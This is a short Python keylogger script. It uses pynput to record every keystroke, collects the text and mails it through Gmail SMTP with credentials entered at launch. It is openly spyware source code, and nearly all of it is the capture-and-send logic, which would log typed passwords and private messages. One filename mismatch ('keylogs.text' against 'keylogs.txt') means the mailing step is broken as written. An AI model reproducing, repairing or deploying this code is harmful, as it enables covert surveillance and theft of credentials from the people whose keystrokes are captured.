from pynput.keyboard import Key, Listener
import logging
import getpass
import smtplib

email=input("Enter Email:")
password=getpass.getpass(prompt='Password:',stream=None)
server=smtplib.SMTP_SSL('smtp.gmail.com',465)
server.login(email,password)
'''
log_dir=''
def file(key):
   #f= open('keylogs.txt','w')
   f.writelines(l)
   #f.close()
#logging.basicConfig(filename=(log_dir + 'keylogs.txt'),level=logging.DEBUG, format='%(message)s')
l=[]    
def on_press(key):
    global f
    f= open('keylogs.txt','w')
    file(str(key))
    l.append(str(key))
    #logging.info((key))

email_char_limit=50
'''
#logger
full_log=''
word=''
email_char_limit=100
l=[]
def on_press(key):
    global word
    global full_log
    global email
    global email_char_limit
    
    if key==Key.space or key==Key.enter:
        word +='  '
        full_log += word
        word = ' '
        if len(full_log) >= email_char_limit:
            l.append(full_log)
            file()
            send_log()
            full_log=' '
    elif key ==Key.shift_l or key== Key.shift_r:
        return
    elif key == Key.backspace:
        word= word[:-1]
    else:
        char= f'{key}'
        char=char[1:-1]
        word +=char
    
    if key ==Key.esc:
        return False

#l=[]
def file():
   global f
   f=open('keylogs.txt','w')
   f.writelines(l)
   f.close() 
def send_log():
    f=open('keylogs.text','r')
    msg='''From: From Person <email>
    To: To Person <email>
    {}
    '''.format(f.read())
    f.close()
    server.sendmail(email,email,msg)    

with Listener(on_press=on_press) as listener:
    listener.join()  